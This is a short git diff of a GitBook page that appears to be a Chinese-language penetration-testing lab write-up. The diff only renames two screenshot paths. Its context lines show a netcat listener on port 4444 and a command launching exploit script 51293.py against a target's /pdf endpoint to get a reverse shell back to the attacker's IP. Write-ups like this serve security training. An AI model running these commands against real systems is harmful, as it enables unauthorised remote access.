@@ -68,9 +68,9 @@ nc -lvnp 4444
 python3 51293.py -s 192.168.45.234 4444 -w http://192.168.225.22:3000/pdf -p url
 ```
 
-<figure><img src="../.gitbook/assets/11 (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/11 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/12 (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/12 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## 提升权限
 
